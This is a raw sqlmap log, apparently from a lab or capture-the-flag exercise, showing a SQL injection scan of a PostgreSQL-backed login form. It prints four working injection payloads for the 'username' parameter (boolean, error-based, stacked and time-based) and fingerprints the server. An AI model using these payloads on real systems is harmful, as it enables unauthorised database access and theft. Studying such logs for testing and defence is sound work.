        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:16:21 /2021-06-25/

[08:16:21] [INFO] parsing HTTP request from 'toolbox.req'
[08:16:21] [INFO] testing connection to the target URL
[08:16:21] [INFO] checking if the target is protected by some kind of WAF/IPS
[08:16:22] [INFO] testing if the target URL content is stable
[08:16:22] [INFO] target URL content is stable
[08:16:22] [INFO] testing if POST parameter 'username' is dynamic
[08:16:22] [WARNING] POST parameter 'username' does not appear to be dynamic
[08:16:22] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'PostgreSQL')
[08:16:23] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (3) value? [Y/n] Y
[08:16:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
got a 302 redirect to 'https://admin.megalogistic.com:443/dashboard.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[08:16:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[08:16:37] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=302)
[08:16:37] [INFO] testing 'Generic inline queries'
[08:16:38] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:16:38] [INFO] POST parameter 'username' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
[08:16:38] [INFO] testing 'PostgreSQL inline queries'
[08:16:38] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:16:50] [INFO] POST parameter 'username' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable
[08:16:50] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[08:17:01] [INFO] POST parameter 'username' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
[08:17:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:17:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:17:07] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[08:17:12] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[08:17:12] [INFO] testing 'Generic UNION query (32) - 21 to 40 columns'
[08:17:18] [INFO] testing 'Generic UNION query (32) - 41 to 60 columns'
[08:17:24] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 135 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-3833' OR 5581=5581-- RLnW&password=password

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin' AND 1316=CAST((CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1316=1316) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(113)||CHR(107)||CHR(113)) AS NUMERIC)-- RYVN&password=password

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin';SELECT PG_SLEEP(5)--&password=password

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=admin' AND 5947=(SELECT 5947 FROM PG_SLEEP(5))-- LcSq&password=password
---
[08:17:24] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[08:17:26] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'

[*] ending @ 08:17:26 /2021-06-25/
